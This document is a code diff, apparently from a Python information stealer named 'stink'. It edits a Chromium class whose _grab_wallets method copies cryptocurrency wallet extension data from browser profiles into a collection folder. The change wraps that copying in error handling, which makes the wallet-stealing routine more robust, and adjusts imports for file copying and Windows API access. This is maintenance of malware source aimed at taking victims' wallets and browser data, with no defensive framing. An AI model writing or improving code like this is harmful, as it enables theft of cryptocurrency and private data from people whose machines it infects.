@@ -3,10 +3,10 @@ from sqlite3 import connect
 from shutil import copyfile
 from base64 import b64decode
 from json import load, loads, dump
+from distutils.dir_util import copy_tree
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
 from ctypes import windll, byref, cdll, c_buffer
-from distutils.dir_util import copy_tree, remove_tree
 
 from stink.helpers import DataBlob
 from stink.enums.features import Features
@@ -311,9 +311,14 @@ class Chromium:
     def _grab_wallets(self, profile: str, wallets: str):
 
         for wallet in self.__config.WalletLogs[self.__browser_name]:
-            filename = rf'{self.__path}\{profile} {wallet["name"]}'
 
-            self._copy_files(filename, rf'{wallets}\{wallet["folder"]}', error="No wallets found")
+            try:
+
+                filename = rf'{self.__path}\{profile} {wallet["name"]}'
+                self._copy_files(filename, rf'{wallets}\{wallet["folder"]}', error="No wallets found")
+
+            except Exception as e:
+                if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
 
     def _process_profile(self, profile: str):
 
